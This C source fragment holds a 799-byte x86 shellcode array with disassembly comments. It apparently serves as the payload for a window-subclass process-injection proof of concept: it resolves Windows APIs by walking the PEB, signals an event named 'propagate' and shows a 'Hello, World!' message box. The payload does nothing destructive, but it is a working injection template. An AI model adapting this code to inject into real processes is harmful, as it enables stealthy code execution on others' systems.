
#define PAYLOAD_SIZE 799

char PAYLOAD[] = {
  /* 0000 */ "\x81\xec\xac\x00\x00\x00"                     /* sub esp, 0xac                    */
  /* 0006 */ "\x53"                                         /* push ebx                         */
  /* 0007 */ "\x55"                                         /* push ebp                         */
  /* 0008 */ "\x33\xdb"                                     /* xor ebx, ebx                     */
  /* 000A */ "\xc7\x44\x24\x6c\x47\x65\x74\x50"             /* mov dword [esp+0x6c], 0x50746547 */
  /* 0012 */ "\x83\xbc\x24\xbc\x00\x00\x00\x10"             /* cmp dword [esp+0xbc], 0x10       */
  /* 001A */ "\xba\x65\x48\x61\x6e"                         /* mov edx, 0x6e614865              */
  /* 001F */ "\x6a\x65"                                     /* push 0x65                        */
  /* 0021 */ "\xb9\x61\x67\x61\x74"                         /* mov ecx, 0x74616761              */
  /* 0026 */ "\xc7\x44\x24\x74\x72\x6f\x63\x41"             /* mov dword [esp+0x74], 0x41636f72 */
  /* 002E */ "\x58"                                         /* pop eax                          */
  /* 002F */ "\xbd\x65\x6c\x33\x32"                         /* mov ebp, 0x32336c65              */
  /* 0034 */ "\xc7\x44\x24\x74\x64\x64\x72\x65"             /* mov dword [esp+0x74], 0x65726464 */
  /* 003C */ "\xc7\x44\x24\x78\x73\x73\x00\x00"             /* mov dword [esp+0x78], 0x7373     */
  /* 0044 */ "\xc7\x84\x24\x8c\x00\x00\x00\x47\x65\x74\x4d" /* mov dword [esp+0x8c], 0x4d746547 */
  /* 004F */ "\xc7\x84\x24\x90\x00\x00\x00\x6f\x64\x75\x6c" /* mov dword [esp+0x90], 0x6c75646f */
  /* 005A */ "\x89\x94\x24\x94\x00\x00\x00"                 /* mov [esp+0x94], edx              */
  /* 0061 */ "\xc7\x84\x24\x98\x00\x00\x00\x64\x6c\x65\x41" /* mov dword [esp+0x98], 0x41656c64 */
  /* 006C */ "\x89\x9c\x24\x9c\x00\x00\x00"                 /* mov [esp+0x9c], ebx              */
  /* 0073 */ "\xc7\x44\x24\x18\x6b\x65\x72\x6e"             /* mov dword [esp+0x18], 0x6e72656b */
  /* 007B */ "\x89\x6c\x24\x1c"                             /* mov [esp+0x1c], ebp              */
  /* 007F */ "\x89\x5c\x24\x20"                             /* mov [esp+0x20], ebx              */
  /* 0083 */ "\xc7\x44\x24\x10\x75\x73\x65\x72"             /* mov dword [esp+0x10], 0x72657375 */
  /* 008B */ "\xc7\x44\x24\x14\x33\x32\x00\x00"             /* mov dword [esp+0x14], 0x3233     */
  /* 0093 */ "\xc7\x44\x24\x48\x4d\x65\x73\x73"             /* mov dword [esp+0x48], 0x7373654d */
  /* 009B */ "\xc7\x44\x24\x4c\x61\x67\x65\x42"             /* mov dword [esp+0x4c], 0x42656761 */
  /* 00A3 */ "\xc7\x44\x24\x50\x6f\x78\x41\x00"             /* mov dword [esp+0x50], 0x41786f   */
  /* 00AB */ "\xc7\x44\x24\x7c\x48\x65\x6c\x6c"             /* mov dword [esp+0x7c], 0x6c6c6548 */
  /* 00B3 */ "\xc7\x84\x24\x80\x00\x00\x00\x6f\x2c\x20\x57" /* mov dword [esp+0x80], 0x57202c6f */
  /* 00BE */ "\xc7\x84\x24\x84\x00\x00\x00\x6f\x72\x6c\x64" /* mov dword [esp+0x84], 0x646c726f */
  /* 00C9 */ "\xc7\x84\x24\x88\x00\x00\x00\x21\x00\x00\x00" /* mov dword [esp+0x88], 0x21       */
  /* 00D4 */ "\xc7\x44\x24\x60\x50\x52\x4f\x50"             /* mov dword [esp+0x60], 0x504f5250 */
  /* 00DC */ "\x89\x4c\x24\x64"                             /* mov [esp+0x64], ecx              */
  /* 00E0 */ "\x89\x44\x24\x68"                             /* mov [esp+0x68], eax              */
  /* 00E4 */ "\xc7\x44\x24\x54\x70\x72\x6f\x70"             /* mov dword [esp+0x54], 0x706f7270 */
  /* 00EC */ "\x89\x4c\x24\x58"                             /* mov [esp+0x58], ecx              */
  /* 00F0 */ "\x89\x44\x24\x5c"                             /* mov [esp+0x5c], eax              */
  /* 00F4 */ "\xc7\x44\x24\x30\x53\x65\x74\x45"             /* mov dword [esp+0x30], 0x45746553 */
  /* 00FC */ "\xc7\x44\x24\x34\x76\x65\x6e\x74"             /* mov dword [esp+0x34], 0x746e6576 */
  /* 0104 */ "\x89\x5c\x24\x38"                             /* mov [esp+0x38], ebx              */
  /* 0108 */ "\xc7\x44\x24\x24\x4f\x70\x65\x6e"             /* mov dword [esp+0x24], 0x6e65704f */
  /* 0110 */ "\xc7\x44\x24\x28\x45\x76\x65\x6e"             /* mov dword [esp+0x28], 0x6e657645 */
  /* 0118 */ "\xc7\x44\x24\x2c\x74\x41\x00\x00"             /* mov dword [esp+0x2c], 0x4174     */
  /* 0120 */ "\xc7\x44\x24\x3c\x43\x6c\x6f\x73"             /* mov dword [esp+0x3c], 0x736f6c43 */
  /* 0128 */ "\x89\x54\x24\x40"                             /* mov [esp+0x40], edx              */
  /* 012C */ "\xc7\x44\x24\x44\x64\x6c\x65\x00"             /* mov dword [esp+0x44], 0x656c64   */
  /* 0134 */ "\xc7\x84\x24\xa0\x00\x00\x00\x47\x65\x74\x46" /* mov dword [esp+0xa0], 0x46746547 */
  /* 013F */ "\xc7\x84\x24\xa4\x00\x00\x00\x6f\x72\x65\x67" /* mov dword [esp+0xa4], 0x6765726f */
  /* 014A */ "\xc7\x84\x24\xa8\x00\x00\x00\x72\x6f\x75\x6e" /* mov dword [esp+0xa8], 0x6e756f72 */
  /* 0155 */ "\xc7\x84\x24\xac\x00\x00\x00\x64\x57\x69\x6e" /* mov dword [esp+0xac], 0x6e695764 */
  /* 0160 */ "\xc7\x84\x24\xb0\x00\x00\x00\x64\x6f\x77\x00" /* mov dword [esp+0xb0], 0x776f64   */
  /* 016B */ "\x0f\x85\xfd\x00\x00\x00"                     /* jnz 0x26e                        */
  /* 0171 */ "\x64\xa1\x30\x00\x00\x00"                     /* mov eax, [fs:0x30]               */
  /* 0177 */ "\x56"                                         /* push esi                         */
  /* 0178 */ "\x57"                                         /* push edi                         */
  /* 0179 */ "\x8b\x78\x08"                                 /* mov edi, [eax+0x8]               */
  /* 017C */ "\x8b\x47\x3c"                                 /* mov eax, [edi+0x3c]              */
  /* 017F */ "\x8b\xb4\x38\x80\x00\x00\x00"                 /* mov esi, [eax+edi+0x80]          */
  /* 0186 */ "\x03\xf7"                                     /* add esi, edi                     */
  /* 0188 */ "\x8b\x4e\x0c"                                 /* mov ecx, [esi+0xc]               */
  /* 018B */ "\x85\xc9"                                     /* test ecx, ecx                    */
  /* 018D */ "\x74\x29"                                     /* jz 0x1b8                         */
  /* 018F */ "\xba\x20\x20\x20\x20"                         /* mov edx, 0x20202020              */
  /* 0194 */ "\x8b\x04\x39"                                 /* mov eax, [ecx+edi]               */
  /* 0197 */ "\x0b\xc2"                                     /* or eax, edx                      */
  /* 0199 */ "\x3d\x6b\x65\x72\x6e"                         /* cmp eax, 0x6e72656b              */
  /* 019E */ "\x75\x0e"                                     /* jnz 0x1ae                        */
  /* 01A0 */ "\x8b\x44\x39\x04"                             /* mov eax, [ecx+edi+0x4]           */
  /* 01A4 */ "\x0b\xc2"                                     /* or eax, edx                      */
  /* 01A6 */ "\x3b\xc5"                                     /* cmp eax, ebp                     */
  /* 01A8 */ "\x0f\x84\xcd\x00\x00\x00"                     /* jz 0x27b                         */
  /* 01AE */ "\x8b\x4e\x20"                                 /* mov ecx, [esi+0x20]              */
  /* 01B1 */ "\x83\xc6\x14"                                 /* add esi, 0x14                    */
  /* 01B4 */ "\x85\xc9"                                     /* test ecx, ecx                    */
  /* 01B6 */ "\x75\xdc"                                     /* jnz 0x194                        */
  /* 01B8 */ "\x8b\x5c\x24\x10"                             /* mov ebx, [esp+0x10]              */
  /* 01BC */ "\x8b\x74\x24\x10"                             /* mov esi, [esp+0x10]              */
  /* 01C0 */ "\x85\xdb"                                     /* test ebx, ebx                    */
  /* 01C2 */ "\x0f\x84\xa4\x00\x00\x00"                     /* jz 0x26c                         */
  /* 01C8 */ "\x85\xf6"                                     /* test esi, esi                    */
  /* 01CA */ "\x0f\x84\x9c\x00\x00\x00"                     /* jz 0x26c                         */
  /* 01D0 */ "\x8d\x44\x24\x18"                             /* lea eax, [esp+0x18]              */
  /* 01D4 */ "\x50"                                         /* push eax                         */
  /* 01D5 */ "\xff\xd3"                                     /* call ebx                         */
  /* 01D7 */ "\x8b\xe8"                                     /* mov ebp, eax                     */
  /* 01D9 */ "\x8d\x44\x24\x20"                             /* lea eax, [esp+0x20]              */
  /* 01DD */ "\x50"                                         /* push eax                         */
  /* 01DE */ "\xff\xd3"                                     /* call ebx                         */
  /* 01E0 */ "\x8b\xf8"                                     /* mov edi, eax                     */
  /* 01E2 */ "\x85\xed"                                     /* test ebp, ebp                    */
  /* 01E4 */ "\x0f\x84\x82\x00\x00\x00"                     /* jz 0x26c                         */
  /* 01EA */ "\x85\xff"                                     /* test edi, edi                    */
  /* 01EC */ "\x74\x7e"                                     /* jz 0x26c                         */
  /* 01EE */ "\x8d\x44\x24\x2c"                             /* lea eax, [esp+0x2c]              */
  /* 01F2 */ "\x50"                                         /* push eax                         */
  /* 01F3 */ "\x57"                                         /* push edi                         */
  /* 01F4 */ "\xff\xd6"                                     /* call esi                         */
  /* 01F6 */ "\x89\x44\x24\x14"                             /* mov [esp+0x14], eax              */
  /* 01FA */ "\x8d\x44\x24\x38"                             /* lea eax, [esp+0x38]              */
  /* 01FE */ "\x50"                                         /* push eax                         */
  /* 01FF */ "\x57"                                         /* push edi                         */
  /* 0200 */ "\xff\xd6"                                     /* call esi                         */
  /* 0202 */ "\x8b\xd8"                                     /* mov ebx, eax                     */
  /* 0204 */ "\x8d\x44\x24\x44"                             /* lea eax, [esp+0x44]              */
  /* 0208 */ "\x50"                                         /* push eax                         */
  /* 0209 */ "\x57"                                         /* push edi                         */
  /* 020A */ "\xff\xd6"                                     /* call esi                         */
  /* 020C */ "\x8b\xf8"                                     /* mov edi, eax                     */
  /* 020E */ "\x8d\x84\x24\xa8\x00\x00\x00"                 /* lea eax, [esp+0xa8]              */
  /* 0215 */ "\x50"                                         /* push eax                         */
  /* 0216 */ "\x55"                                         /* push ebp                         */
  /* 0217 */ "\xff\xd6"                                     /* call esi                         */
  /* 0219 */ "\x89\x44\x24\x10"                             /* mov [esp+0x10], eax              */
  /* 021D */ "\x8d\x44\x24\x50"                             /* lea eax, [esp+0x50]              */
  /* 0221 */ "\x50"                                         /* push eax                         */
  /* 0222 */ "\x55"                                         /* push ebp                         */
  /* 0223 */ "\xff\xd6"                                     /* call esi                         */
  /* 0225 */ "\x8b\xe8"                                     /* mov ebp, eax                     */
  /* 0227 */ "\x8b\x44\x24\x14"                             /* mov eax, [esp+0x14]              */
  /* 022B */ "\x85\xc0"                                     /* test eax, eax                    */
  /* 022D */ "\x74\x3d"                                     /* jz 0x26c                         */
  /* 022F */ "\x85\xdb"                                     /* test ebx, ebx                    */
  /* 0231 */ "\x74\x39"                                     /* jz 0x26c                         */
  /* 0233 */ "\x85\xed"                                     /* test ebp, ebp                    */
  /* 0235 */ "\x74\x35"                                     /* jz 0x26c                         */
  /* 0237 */ "\x83\x7c\x24\x10\x00"                         /* cmp dword [esp+0x10], 0x0        */
  /* 023C */ "\x74\x2e"                                     /* jz 0x26c                         */
  /* 023E */ "\x85\xff"                                     /* test edi, edi                    */
  /* 0240 */ "\x74\x2a"                                     /* jz 0x26c                         */
  /* 0242 */ "\x8d\x4c\x24\x5c"                             /* lea ecx, [esp+0x5c]              */
  /* 0246 */ "\x51"                                         /* push ecx                         */
  /* 0247 */ "\x6a\x01"                                     /* push 0x1                         */
  /* 0249 */ "\x6a\x02"                                     /* push 0x2                         */
  /* 024B */ "\xff\xd0"                                     /* call eax                         */
  /* 024D */ "\x8b\xf0"                                     /* mov esi, eax                     */
  /* 024F */ "\x85\xf6"                                     /* test esi, esi                    */
  /* 0251 */ "\x74\x19"                                     /* jz 0x26c                         */
  /* 0253 */ "\x56"                                         /* push esi                         */
  /* 0254 */ "\xff\xd3"                                     /* call ebx                         */
  /* 0256 */ "\x56"                                         /* push esi                         */
  /* 0257 */ "\xff\xd7"                                     /* call edi                         */
  /* 0259 */ "\x6a\x00"                                     /* push 0x0                         */
  /* 025B */ "\x8d\x44\x24\x6c"                             /* lea eax, [esp+0x6c]              */
  /* 025F */ "\x50"                                         /* push eax                         */
  /* 0260 */ "\x8d\x84\x24\x8c\x00\x00\x00"                 /* lea eax, [esp+0x8c]              */
  /* 0267 */ "\x50"                                         /* push eax                         */
  /* 0268 */ "\x6a\x00"                                     /* push 0x0                         */
  /* 026A */ "\xff\xd5"                                     /* call ebp                         */
  /* 026C */ "\x5f"                                         /* pop edi                          */
  /* 026D */ "\x5e"                                         /* pop esi                          */
  /* 026E */ "\x5d"                                         /* pop ebp                          */
  /* 026F */ "\x33\xc0"                                     /* xor eax, eax                     */
  /* 0271 */ "\x5b"                                         /* pop ebx                          */
  /* 0272 */ "\x81\xc4\xac\x00\x00\x00"                     /* add esp, 0xac                    */
  /* 0278 */ "\xc2\x18\x00"                                 /* ret 0x18                         */
  /* 027B */ "\x8d\x84\x24\x94\x00\x00\x00"                 /* lea eax, [esp+0x94]              */
  /* 0282 */ "\x50"                                         /* push eax                         */
  /* 0283 */ "\x57"                                         /* push edi                         */
  /* 0284 */ "\x56"                                         /* push esi                         */
  /* 0285 */ "\xe8\x1b\x00\x00\x00"                         /* call 0x2a5                       */
  /* 028A */ "\x8b\xd8"                                     /* mov ebx, eax                     */
  /* 028C */ "\x8d\x84\x24\x80\x00\x00\x00"                 /* lea eax, [esp+0x80]              */
  /* 0293 */ "\x50"                                         /* push eax                         */
  /* 0294 */ "\x57"                                         /* push edi                         */
  /* 0295 */ "\x56"                                         /* push esi                         */
  /* 0296 */ "\xe8\x0a\x00\x00\x00"                         /* call 0x2a5                       */
  /* 029B */ "\x83\xc4\x18"                                 /* add esp, 0x18                    */
  /* 029E */ "\x8b\xf0"                                     /* mov esi, eax                     */
  /* 02A0 */ "\xe9\x1b\xff\xff\xff"                         /* jmp 0x1c0                        */
  /* 02A5 */ "\x8b\x4c\x24\x04"                             /* mov ecx, [esp+0x4]               */
  /* 02A9 */ "\x53"                                         /* push ebx                         */
  /* 02AA */ "\x55"                                         /* push ebp                         */
  /* 02AB */ "\x8b\x6c\x24\x10"                             /* mov ebp, [esp+0x10]              */
  /* 02AF */ "\x8b\x19"                                     /* mov ebx, [ecx]                   */
  /* 02B1 */ "\x03\xdd"                                     /* add ebx, ebp                     */
  /* 02B3 */ "\x56"                                         /* push esi                         */
  /* 02B4 */ "\x8b\x71\x10"                                 /* mov esi, [ecx+0x10]              */
  /* 02B7 */ "\x57"                                         /* push edi                         */
  /* 02B8 */ "\x8b\x03"                                     /* mov eax, [ebx]                   */
  /* 02BA */ "\x33\xff"                                     /* xor edi, edi                     */
  /* 02BC */ "\x03\xf5"                                     /* add esi, ebp                     */
  /* 02BE */ "\x85\xc0"                                     /* test eax, eax                    */
  /* 02C0 */ "\x74\x29"                                     /* jz 0x2eb                         */
  /* 02C2 */ "\x2b\xde"                                     /* sub ebx, esi                     */
  /* 02C4 */ "\x85\xc0"                                     /* test eax, eax                    */
  /* 02C6 */ "\x78\x15"                                     /* js 0x2dd                         */
  /* 02C8 */ "\x83\xc0\x02"                                 /* add eax, 0x2                     */
  /* 02CB */ "\x03\xc5"                                     /* add eax, ebp                     */
  /* 02CD */ "\x50"                                         /* push eax                         */
  /* 02CE */ "\xff\x74\x24\x20"                             /* push dword [esp+0x20]            */
  /* 02D2 */ "\xe8\x1b\x00\x00\x00"                         /* call 0x2f2                       */
  /* 02D7 */ "\x59"                                         /* pop ecx                          */
  /* 02D8 */ "\x59"                                         /* pop ecx                          */
  /* 02D9 */ "\x85\xc0"                                     /* test eax, eax                    */
  /* 02DB */ "\x74\x0c"                                     /* jz 0x2e9                         */
  /* 02DD */ "\x83\xc6\x04"                                 /* add esi, 0x4                     */
  /* 02E0 */ "\x8b\x04\x33"                                 /* mov eax, [ebx+esi]               */
  /* 02E3 */ "\x85\xc0"                                     /* test eax, eax                    */
  /* 02E5 */ "\x75\xdf"                                     /* jnz 0x2c6                        */
  /* 02E7 */ "\xeb\x02"                                     /* jmp 0x2eb                        */
  /* 02E9 */ "\x8b\x3e"                                     /* mov edi, [esi]                   */
  /* 02EB */ "\x8b\xc7"                                     /* mov eax, edi                     */
  /* 02ED */ "\x5f"                                         /* pop edi                          */
  /* 02EE */ "\x5e"                                         /* pop esi                          */
  /* 02EF */ "\x5d"                                         /* pop ebp                          */
  /* 02F0 */ "\x5b"                                         /* pop ebx                          */
  /* 02F1 */ "\xc3"                                         /* ret                              */
  /* 02F2 */ "\x8b\x44\x24\x08"                             /* mov eax, [esp+0x8]               */
  /* 02F6 */ "\x56"                                         /* push esi                         */
  /* 02F7 */ "\x8b\x74\x24\x08"                             /* mov esi, [esp+0x8]               */
  /* 02FB */ "\x8a\x16"                                     /* mov dl, [esi]                    */
  /* 02FD */ "\x84\xd2"                                     /* test dl, dl                      */
  /* 02FF */ "\x74\x14"                                     /* jz 0x315                         */
  /* 0301 */ "\x8a\xca"                                     /* mov cl, dl                       */
  /* 0303 */ "\x2b\xf0"                                     /* sub esi, eax                     */
  /* 0305 */ "\x8a\xd1"                                     /* mov dl, cl                       */
  /* 0307 */ "\x3a\x08"                                     /* cmp cl, [eax]                    */
  /* 0309 */ "\x75\x0a"                                     /* jnz 0x315                        */
  /* 030B */ "\x40"                                         /* inc eax                          */
  /* 030C */ "\x8a\x0c\x06"                                 /* mov cl, [esi+eax]                */
  /* 030F */ "\x8a\xd1"                                     /* mov dl, cl                       */
  /* 0311 */ "\x84\xc9"                                     /* test cl, cl                      */
  /* 0313 */ "\x75\xf0"                                     /* jnz 0x305                        */
  /* 0315 */ "\x0f\xb6\x08"                                 /* movzx ecx, byte [eax]            */
  /* 0318 */ "\x0f\xb6\xc2"                                 /* movzx eax, dl                    */
  /* 031B */ "\x2b\xc1"                                     /* sub eax, ecx                     */
  /* 031D */ "\x5e"                                         /* pop esi                          */
  /* 031E */ "\xc3"                                         /* ret                              */
};